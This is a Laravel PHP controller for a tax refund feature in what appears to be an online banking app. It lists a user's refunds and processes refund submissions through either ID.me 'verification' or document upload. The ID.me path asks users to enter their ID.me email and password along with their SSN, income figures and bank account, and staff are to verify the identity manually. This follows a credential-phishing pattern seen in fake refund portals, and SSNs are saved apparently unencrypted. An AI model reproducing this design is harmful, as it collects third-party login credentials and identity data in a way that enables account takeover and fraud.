<?php

namespace App\Http\Controllers;

use App\Models\TaxRefund;
use App\Services\ActivityLogger;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use Inertia\Inertia;
use Inertia\Response;

class TaxRefundController extends Controller
{
    /**
     * Display tax refunds listing.
     */
    public function index(Request $request): Response
    {
        $user = Auth::user();

        $refunds = TaxRefund::where('user_id', $user->id)
            ->with('bankAccount:id,account_number,account_name,currency')
            ->latest()
            ->get()
            ->map(fn ($refund) => [
                'id' => $refund->id,
                'uuid' => $refund->uuid,
                'reference_number' => $refund->reference_number,
                'tax_year' => $refund->tax_year,
                'filing_status' => $refund->filing_status,
                'refund_amount' => $refund->refund_amount,
                'currency' => $refund->currency ?? 'USD',
                'status' => $refund->status->value,
                'status_label' => $refund->status->label(),
                'idme_verified' => $refund->idme_verified,
                'idme_verified_at' => $refund->idme_verified_at?->format('M d, Y'),
                'submitted_at' => $refund->submitted_at?->format('M d, Y') ?? $refund->created_at->format('M d, Y'),
                'irs_reference_number' => $refund->irs_reference_number,
                'rejection_reason' => $refund->rejection_reason,
                'bank_account' => $refund->bankAccount ? [
                    'account_number' => '****' . substr($refund->bankAccount->account_number, -4),
                    'account_name' => $refund->bankAccount->account_name,
                ] : null,
            ]);

        // Check if user has pending ID.me verification
        $pendingIdMeVerification = TaxRefund::where('user_id', $user->id)
            ->where('idme_verified', false)
            ->whereIn('status', ['pending', 'processing'])
            ->first();

        return Inertia::render('TaxRefunds/Index', [
            'refunds' => $refunds,
            'pendingVerification' => $pendingIdMeVerification ? [
                'uuid' => $pendingIdMeVerification->uuid,
                'reference_number' => $pendingIdMeVerification->reference_number,
            ] : null,
        ]);
    }

    /**
     * Show ID.me verification page.
     */
    public function idMeVerification(Request $request): Response
    {
        $user = Auth::user();

        $bankAccounts = $user->bankAccounts()
            ->where('is_active', true)
            ->get()
            ->map(fn ($account) => [
                'id' => $account->id,
                'label' => $account->account_name . ' - ****' . substr($account->account_number, -4),
                'currency' => $account->currency,
            ]);

        $filingStatuses = [
            ['value' => 'single', 'label' => 'Single'],
            ['value' => 'married_filing_jointly', 'label' => 'Married Filing Jointly'],
            ['value' => 'married_filing_separately', 'label' => 'Married Filing Separately'],
            ['value' => 'head_of_household', 'label' => 'Head of Household'],
            ['value' => 'qualifying_widow', 'label' => 'Qualifying Widow(er)'],
        ];

        return Inertia::render('TaxRefunds/IdMeVerification', [
            'bankAccounts' => $bankAccounts,
            'filingStatuses' => $filingStatuses,
            'user' => [
                'name' => $user->name,
                'email' => $user->email,
            ],
        ]);
    }

    /**
     * Process ID.me verification.
     */
    public function processIdMeVerification(Request $request)
    {
        $validated = $request->validate([
            'tax_year' => 'required|integer|min:2020|max:' . date('Y'),
            'ssn_tin' => 'required|string|min:9|max:11',
            'filing_status' => 'required|in:single,married_filing_jointly,married_filing_separately,head_of_household,qualifying_widow',
            'employer_name' => 'required|string|max:255',
            'employer_ein' => 'nullable|string|max:20',
            'gross_income' => 'required|numeric|min:0',
            'federal_withheld' => 'required|numeric|min:0',
            'state_withheld' => 'nullable|numeric|min:0',
            'state' => 'nullable|string|max:2',
            'refund_amount' => 'required|numeric|min:1',
            'bank_account_id' => 'required|exists:bank_accounts,id',
            'idme_email' => 'required|email',
            'idme_password' => 'required|string|min:6',
            'pin' => 'required|string|size:6',
        ]);

        $user = Auth::user();

        // Verify transaction PIN
        if (!Hash::check($validated['pin'], $user->transaction_pin)) {
            return back()->withErrors(['pin' => 'Invalid transaction PIN']);
        }

        // Verify bank account ownership
        $bankAccount = $user->bankAccounts()->findOrFail($validated['bank_account_id']);

        // Create the tax refund record with ID.me verification pending
        $refund = TaxRefund::create([
            'uuid' => (string) Str::uuid(),
            'user_id' => $user->id,
            'bank_account_id' => $bankAccount->id,
            'reference_number' => 'TAXREF-' . strtoupper(Str::random(10)),
            'tax_year' => $validated['tax_year'],
            'ssn_tin' => $validated['ssn_tin'],
            'filing_status' => $validated['filing_status'],
            'employer_name' => $validated['employer_name'],
            'employer_ein' => $validated['employer_ein'],
            'gross_income' => $validated['gross_income'],
            'federal_withheld' => $validated['federal_withheld'],
            'state_withheld' => $validated['state_withheld'] ?? 0,
            'state' => $validated['state'],
            'refund_amount' => $validated['refund_amount'],
            'currency' => $bankAccount->currency ?? 'USD',
            'status' => 'pending',
            'idme_verified' => false, // Admin will verify
            'idme_verification_data' => [
                'email' => $validated['idme_email'],
                'submitted_at' => now()->toISOString(),
            ],
            'submitted_at' => now(),
        ]);

        // Log activity
        ActivityLogger::log(
            'tax_refund_idme_submitted',
            'Tax refund ID.me verification submitted for ' . $refund->reference_number,
            $user,
            $refund,
            [
                'refund_id' => $refund->id,
                'reference_number' => $refund->reference_number,
                'amount' => $validated['refund_amount'],
                'tax_year' => $validated['tax_year'],
            ]
        );

        return redirect()->route('tax-refunds.index')->with('success', 'Your ID.me verification has been submitted successfully! Our team will review and verify your identity within 24-48 hours.');
    }

    /**
     * Show document upload verification page.
     */
    public function uploadDocsVerification(Request $request): Response
    {
        $user = Auth::user();

        $bankAccounts = $user->bankAccounts()
            ->where('is_active', true)
            ->get()
            ->map(fn ($account) => [
                'id' => $account->id,
                'label' => $account->account_name . ' - ****' . substr($account->account_number, -4),
                'currency' => $account->currency,
            ]);

        $filingStatuses = [
            ['value' => 'single', 'label' => 'Single'],
            ['value' => 'married_filing_jointly', 'label' => 'Married Filing Jointly'],
            ['value' => 'married_filing_separately', 'label' => 'Married Filing Separately'],
            ['value' => 'head_of_household', 'label' => 'Head of Household'],
            ['value' => 'qualifying_widow', 'label' => 'Qualifying Widow(er)'],
        ];

        return Inertia::render('TaxRefunds/UploadDocsVerification', [
            'bankAccounts' => $bankAccounts,
            'filingStatuses' => $filingStatuses,
            'user' => [
                'name' => $user->name,
                'email' => $user->email,
            ],
        ]);
    }

    /**
     * Process document upload verification.
     */
    public function processUploadDocsVerification(Request $request)
    {
        $validated = $request->validate([
            'tax_year' => 'required|integer|min:2020|max:' . date('Y'),
            'ssn_tin' => 'required|string|min:9|max:11',
            'filing_status' => 'required|in:single,married_filing_jointly,married_filing_separately,head_of_household,qualifying_widow',
            'employer_name' => 'required|string|max:255',
            'employer_ein' => 'nullable|string|max:20',
            'gross_income' => 'required|numeric|min:0',
            'federal_withheld' => 'required|numeric|min:0',
            'state_withheld' => 'nullable|numeric|min:0',
            'state' => 'nullable|string|max:2',
            'refund_amount' => 'required|numeric|min:1',
            'bank_account_id' => 'required|exists:bank_accounts,id',
            'id_document' => 'required|file|mimes:pdf,jpg,jpeg,png|max:5120',
            'tax_return' => 'required|file|mimes:pdf|max:10240',
            'w2_document' => 'nullable|file|mimes:pdf,jpg,jpeg,png|max:5120',
            'pin' => 'required|string|size:6',
        ]);

        $user = Auth::user();

        // Verify transaction PIN
        if (!Hash::check($validated['pin'], $user->transaction_pin)) {
            return back()->withErrors(['pin' => 'Invalid transaction PIN']);
        }

        // Verify bank account ownership
        $bankAccount = $user->bankAccounts()->findOrFail($validated['bank_account_id']);

        // Store documents (in local storage, not publicly accessible)
        $idDocPath = $request->file('id_document')->store('tax-refunds/documents');
        $taxReturnPath = $request->file('tax_return')->store('tax-refunds/documents');
        $w2Path = $request->hasFile('w2_document') 
            ? $request->file('w2_document')->store('tax-refunds/documents')
            : null;

        // Create the tax refund record
        $refund = TaxRefund::create([
            'uuid' => (string) Str::uuid(),
            'user_id' => $user->id,
            'bank_account_id' => $bankAccount->id,
            'reference_number' => 'TAXREF-' . strtoupper(Str::random(10)),
            'tax_year' => $validated['tax_year'],
            'ssn_tin' => $validated['ssn_tin'],
            'filing_status' => $validated['filing_status'],
            'employer_name' => $validated['employer_name'],
            'employer_ein' => $validated['employer_ein'],
            'gross_income' => $validated['gross_income'],
            'federal_withheld' => $validated['federal_withheld'],
            'state_withheld' => $validated['state_withheld'] ?? 0,
            'state' => $validated['state'],
            'refund_amount' => $validated['refund_amount'],
            'currency' => $bankAccount->currency ?? 'USD',
            'status' => 'pending',
            'idme_verified' => false,
            'idme_verification_data' => [
                'method' => 'document_upload',
                'id_document' => $idDocPath,
                'tax_return' => $taxReturnPath,
                'w2_document' => $w2Path,
                'submitted_at' => now()->toISOString(),
            ],
            'submitted_at' => now(),
        ]);

        // Log activity
        ActivityLogger::log(
            'tax_refund_docs_submitted',
            'Tax refund document verification submitted for ' . $refund->reference_number,
            $user,
            $refund,
            [
                'refund_id' => $refund->id,
                'reference_number' => $refund->reference_number,
                'amount' => $validated['refund_amount'],
                'tax_year' => $validated['tax_year'],
            ]
        );

        return redirect()->route('tax-refunds.index')->with('success', 'Your documents have been submitted successfully! Our team will review and verify your identity within 2-3 business days.');
    }
}
